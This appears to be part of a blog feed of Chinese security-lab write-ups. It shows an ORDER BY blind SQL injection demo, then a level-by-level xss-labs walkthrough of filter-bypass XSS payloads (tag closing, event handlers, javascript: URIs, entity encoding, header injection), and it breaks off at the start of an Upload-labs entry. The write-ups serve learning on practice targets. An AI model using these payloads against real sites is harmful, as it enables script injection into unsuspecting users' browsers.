byç›²æ³¨"></a>order byç›²æ³¨</h4><p>é€šè¿‡å­—å…¸åºæ¥çŒœæµ‹å†…å®¹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;#a <span class="operator">&lt;</span> h,å›æ˜¾a</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> a        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hcj      <span class="operator">|</span> <span class="number">123456</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;i&#x27;</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hcj      <span class="operator">|</span> <span class="number">123456</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> i        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;hci&#x27;</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hci      <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hcj      <span class="operator">|</span> <span class="number">123456</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;hck&#x27;</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hcj      <span class="operator">|</span> <span class="number">123456</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hck      <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SWPU2019-Web1&quot;&gt;&lt;a href=&quot;#SWPU2019-Web1&quot; class=&quot;headerlink&quot; title=&quot;SWPU2019-Web1&quot;&gt;&lt;/a&gt;SWPU2019-Web1&lt;/h1&gt;&lt;p&gt;åœ¨æ³¨å†Œç™»å½•åå¹¿å‘Šç”³è¯·å¤„ å¹¿å‘Šåå­—æ®µå­˜åœ¨æ³¨å…¥&lt;/p&gt;
</summary>
      
    
    
    
    <category term="buuåˆ·é¢˜è®°å½•" scheme="http://example.com/categories/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="mysqlç»•è¿‡information_schemaæ³¨å…¥" scheme="http://example.com/tags/mysql%E7%BB%95%E8%BF%87information-schema%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>xss-labs</title>
    <link href="http://example.com/2024/02/20/xss-labs/"/>
    <id>http://example.com/2024/02/20/xss-labs/</id>
    <published>2024-02-20T10:07:56.000Z</published>
    <updated>2024-02-24T02:50:23.732Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss-labs"><a href="#xss-labs" class="headerlink" title="xss-labs"></a>xss-labs</h1><p>æ‰‹åŠ¨æ­å»ºäº†ä¸€ä¸ªæœ¬åœ°é¶åœº</p><p>åŸgithubé¡¹ç›®åœ°å€</p><p><a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></p><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220181007551.png"></p><h2 id="level-2-â€œ-é—­åˆ"><a href="#level-2-â€œ-é—­åˆ" class="headerlink" title="level 2(â€œ&gt;é—­åˆ)"></a>level 2(â€œ&gt;é—­åˆ)</h2><p>äº§çœ‹æºç å‘ç°ä¸ä¸Šä¸€å…³ä¸åŒçš„æ˜¯ä½¿ç”¨äº†ä»¥ä¸‹å‡½æ•°:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//htmlspecialchars($str)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨å¦ä¸€ä¸ªä½ç½®ä¹Ÿå°±æ˜¯è¾“å…¥æ¡†å†…, å¹¶æ²¡æœ‰ä½¿ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt; </span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å¯ä»¥æ„é€ é—­åˆæ‰inputåŠå…¶å±æ€§</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223163910163.png" alt="image-20240223163910163"></p><h2 id="level-3-æ„é€ é¼ æ ‡äº‹ä»¶"><a href="#level-3-æ„é€ é¼ æ ‡äº‹ä»¶" class="headerlink" title="level 3(æ„é€ é¼ æ ‡äº‹ä»¶)"></a>level 3(æ„é€ é¼ æ ‡äº‹ä»¶)</h2><p>ç›¸è¾ƒäºä¸Šä¸€å…³, è¿™å…³éƒ½åŠ äº† htmlspecialchars($str) è¿›è¡Œè½¬ä¹‰</p><p>ä½†æ˜¯</p><blockquote><p>htmlspecialchars($str) é»˜è®¤ä¸è½¬ä¹‰å•å¼•å·</p></blockquote><p>å› æ­¤å¯ä»¥æ„é€ ä¸€ä¸ªonclickæ—¶é—´, ç‚¹å‡»åæ‰§è¡Œjsä»£ç </p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(1)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223164554832.png" alt="image-20240223164554832"></p><p>ç‚¹å‡»è¾“å…¥æ¡†å°±ä¼šæ‰§è¡Œjs</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223164620880.png" alt="image-20240223164620880"></p><h2 id="level-4-æ„é€ é¼ æ ‡äº‹ä»¶"><a href="#level-4-æ„é€ é¼ æ ‡äº‹ä»¶" class="headerlink" title="level 4(æ„é€ é¼ æ ‡äº‹ä»¶)"></a>level 4(æ„é€ é¼ æ ‡äº‹ä»¶)</h2><p>ç®€å•æµ‹è¯•å‘ç°è¿™é‡Œç›´æ¥åˆ é™¤äº†å°–æ‹¬å·, ä½†æ˜¯å¹¶æ²¡æœ‰åˆ é™¤åŒå¼•å·, å¹¶ä¸”ä¹Ÿæ²¡å¯¹åŒå¼•å·è¿›è¡Œè½¬ä¹‰</p><p>æ°å·§è¿™é‡Œçš„valueå±æ€§ä½¿ç”¨åŒå¼•å·é—­åˆ</p><p>åªéœ€å°†ä¸Šä¸€é¢˜çš„å•å¼•å·æ”¹ä¸ºåŒå¼•å·å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223165143411.png" alt="image-20240223165143411"></p><h2 id="level-5-ä¼ªåè®®JavaScript"><a href="#level-5-ä¼ªåè®®JavaScript" class="headerlink" title="level 5(ä¼ªåè®®JavaScript:)"></a>level 5(ä¼ªåè®®JavaScript:)</h2><p>è¿™å…³ä¼¼ä¹æ·»åŠ äº†é»‘åå•,ä¹‹å‰çš„<code>&lt;script&gt; onclick</code>ä¼šè¢«ä¿®æ”¹ä¸º<code>o_nclick &lt;scr_ipt&gt;</code></p><p>ä½¿ç”¨**JavaScript:**ä¼ªåè®®æ¥æ‰§è¡Œjs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223170134184.png" alt="image-20240223170134184"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223170148930.png" alt="image-20240223170148930"></p><p>ç‚¹å‡»æ’å…¥çš„è¶…é“¾æ¥å³å¯</p><h2 id="level-6-å¤§å°å†™ç»•è¿‡"><a href="#level-6-å¤§å°å†™ç»•è¿‡" class="headerlink" title="level 6 (å¤§å°å†™ç»•è¿‡)"></a>level 6 (å¤§å°å†™ç»•è¿‡)</h2><p>è¿™é‡Œä½¿ç”¨ä¸Šä¸€å…³çš„payloadä¼šå‘ç°hrefä¹Ÿè¢«è¿‡æ»¤äº†</p><p>ä½†æ˜¯æˆ‘ä»¬çŸ¥é“, htmlæ˜¯å¤§å°å†™ä¸æ•æ„Ÿçš„</p><p>ç›´æ¥æ„é€ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hREf=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223170543131.png" alt="image-20240223170543131"></p><p>éƒ¨åˆ†æºç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br></pre></td></tr></table></figure><h2 id="level-7-åŒå†™ç»•è¿‡"><a href="#level-7-åŒå†™ç»•è¿‡" class="headerlink" title="level 7(åŒå†™ç»•è¿‡)"></a>level 7(åŒå†™ç»•è¿‡)</h2><p>è¿™å…³ä¼šåˆ é™¤äº†script  href ç­‰ç­‰å­—ç¬¦ä¸²</p><p>åªéœ€è¦åŒå†™ç»•è¿‡å³å¯</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrhrefef=javascrscriptipt:alert(1)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223171113140.png" alt="image-20240223171113140"></p><p>éƒ¨åˆ†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> =<span class="title function_ invoke__">strtolower</span>( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str5</span>);</span><br></pre></td></tr></table></figure><h2 id="level-8-å®ä½“ç¼–ç ç»•è¿‡"><a href="#level-8-å®ä½“ç¼–ç ç»•è¿‡" class="headerlink" title="level 8(å®ä½“ç¼–ç ç»•è¿‡)"></a>level 8(å®ä½“ç¼–ç ç»•è¿‡)</h2><p>è¿™å…³è¿‡æ»¤çš„æ›´åŠ ä¸¥æ ¼, å¤§å°å†™, è½¬ä¹‰, æ›¿æ¢ éƒ½ç”¨ä¸Šäº†</p><p>ä½†æ˜¯æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ä¼šè¢«æ”¾è¿›ä¸€ä¸ªè¶…é“¾æ¥é‡Œ</p><p>å¯ä»¥ä½¿ç”¨å®ä½“ç¼–ç æ¥ç»•è¿‡å¯¹æˆ‘ä»¬è¾“å…¥å†…å®¹çš„æ›¿æ¢</p><p><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">https://www.qqxiuzi.cn/bianma/zifushiti.php</a></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172033713.png" alt="image-20240223172033713"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172232860.png" alt="image-20240223172232860"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172002536.png" alt="image-20240223172002536"></p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172339270.png" alt="image-20240223172339270"></p><p>è¿™å…³æˆ‘ä»¥ä¸ºæ˜¯è¯†åˆ«åˆ°ç¼–ç äº†, å®é™…ä¸Šæ˜¯éœ€è¦å«æœ‰<code>http://</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¹¶æ²¡æœ‰è¦æ±‚è¦ä»¥<code>http://</code>å¼€å¤´, æ‰€ä»¥åªéœ€è¦æŠŠå®ƒåŠ åœ¨åé¢å¹¶æ³¨é‡Šæ‰å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;//http://</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172906831.png" alt="image-20240223172906831"></p><h2 id="level-10-ä¿®æ”¹hiddenå†…å®¹"><a href="#level-10-ä¿®æ”¹hiddenå†…å®¹" class="headerlink" title="level 10(ä¿®æ”¹hiddenå†…å®¹)"></a>level 10(ä¿®æ”¹hiddenå†…å®¹)</h2><p>éšä¾¿è¾“å…¥ä¸€ä¸‹, å‘ç°è¿™é‡Œè¿˜æœ‰å‡ ä¸ªéšè—å‚æ•°</p><p>è¿™é‡Œå°è¯•getå°†åŒåéƒ½æäº¤ä¸€é</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://xss-labs/level10.php</span><br><span class="line">?keyword=1</span><br><span class="line">&amp;t_link=2</span><br><span class="line">&amp;t_history=3</span><br><span class="line">&amp;t_sort=4</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223173715090.png" alt="image-20240223173715090"></p><p>å‘ç°t_sortæ˜¯æœ‰å›æ˜¾çš„</p><p>ç®€å•æµ‹è¯•åå‘ç°ä¼šåˆ é™¤å°–æ‹¬å·, ä½†ä¾ç„¶å¯ä»¥æ„é€ é¼ æ ‡äº‹ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?keyword=1</span><br><span class="line">&amp;t_link=2</span><br><span class="line">&amp;t_history=3</span><br><span class="line">&amp;t_sort=4&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223173920165.png" alt="image-20240223173920165"></p><h2 id="level-11-refereræ³¨å…¥"><a href="#level-11-refereræ³¨å…¥" class="headerlink" title="level 11(refereræ³¨å…¥)"></a>level 11(refereræ³¨å…¥)</h2><p>è¿™é‡ŒæŸ¥çœ‹æºç ä¼šå‘ç°æœ‰ä¸€ä¸ªå‚æ•°çš„å€¼éå¸¸ç‰¹æ®Š</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223174342942.png" alt="image-20240223174342942"></p><p>è¿™ä¸ªt_refçš„å€¼æ­£å¼æˆ‘ä»¬ä¸Šä¸€å…³çš„åœ°å€å’Œpayload</p><p>æˆ‘ä»¬éƒ½çŸ¥é“httpå¤´çš„refereræ­£æ˜¯è®°å½•äº†ä¸Šä¸€ä¸ªé¡µé¢çš„åœ°å€, æ‰€ä»¥è¿™é‡Œå¯ä»¥é€šè¿‡ä¿®æ”¹refereræ¥æ³¨å…¥</p><p>æ·»åŠ httpå¤´:</p><p><code>Referer: &quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223174857257.png" alt="image-20240223174857257"></p><h2 id="level-12-User-Agentæ³¨å…¥"><a href="#level-12-User-Agentæ³¨å…¥" class="headerlink" title="level 12(User-Agentæ³¨å…¥)"></a>level 12(User-Agentæ³¨å…¥)</h2><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223175032662.png" alt="image-20240223175032662"></p><p>è¿™é‡Œåˆå¤šå‡ºæ¥ä¸€ä¸ªt_ua ä¸å¿…å¤šè¯´, User-Agentæ³¨å…¥</p><p>ä¿®æ”¹User-Agentå³å¯</p><p><code>User-Agent: &quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223175138909.png" alt="image-20240223175138909"></p><h2 id="level-13-cookieæ³¨å…¥"><a href="#level-13-cookieæ³¨å…¥" class="headerlink" title="level 13(cookieæ³¨å…¥)"></a>level 13(cookieæ³¨å…¥)</h2><p>è¿™é‡ŒæŠ“åŒ…ä¼šå‘ç°å¸¦äº†ä¸€ä¸ªcookie, è¿”å›å†…å®¹t_cookä¸­çš„å†…å®¹æ­£å¥½æ˜¯cookieä¸­çš„å†…å®¹</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223175436189.png" alt="image-20240223175436189"></p><p>æ›´æ”¹cookieä¸­çš„å†…å®¹ä¸ºå‰ä¸¤å…³çš„payloadå³å¯</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223175555490.png" alt="image-20240223175555490"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss-labs&quot;&gt;&lt;a href=&quot;#xss-labs&quot; class=&quot;headerlink&quot; title=&quot;xss-labs&quot;&gt;&lt;/a&gt;xss-labs&lt;/h1&gt;&lt;p&gt;æ‰‹åŠ¨æ­å»ºäº†ä¸€ä¸ªæœ¬åœ°é¶åœº&lt;/p&gt;
&lt;p&gt;åŸgithubé¡¹ç›®åœ°å€&lt;/p&gt;
&lt;p&gt;&lt;a href=</summary>
      
    
    
    
    <category term="é¶åœº" scheme="http://example.com/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Upload-labs</title>
    <link href="http://example.com/2024/02/19/Upload-labs/"/>
    <id>http://example.com/2024/02/19/Upload-labs/</id>
    <published>2024-02-19T13:40:48.000Z</published>
    <updated>2024-02-23T07:59:31.647Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Upload-labs"><a href="#Upload-labs" class="headerlink" title="Upload-labs"></a>Upload-labs</h1><p>ç½‘ä¸Šæœ‰21å…³çš„å’Œ20å…³ä¸¤ç§,åœ¨è¿™é‡Œä»¥buu upload-labs linux ä¹Ÿå°±æ˜¯20å…³çš„æ¥æ’åº,å¹¶ä¸”åœ¨æœ¬åœ°æ­å»ºäº†21å…³çš„labs</p><p>å³åŒ…å«äº†21å…³å…¨éƒ¨å†…å®¹</p><h2 id="Pass-01-å‰ç«¯éªŒè¯"><a href="#Pass-01-å‰ç«¯éªŒè¯" class="headerlink" title="Pass-01(å‰ç«¯éªŒè¯)"></a>Pass-01(å‰ç«¯éªŒè¯)</h2><p>ç®€å•çš„å‰ç«¯jséªŒè¯</p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-01/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>d6201cdc-7e17-4a35-8198-4b2a83f9aded.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>316</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://d6201cdc-7e17-4a35-8198-4b2a83f9aded.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryKhKT7v8SLthN7HCS</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) 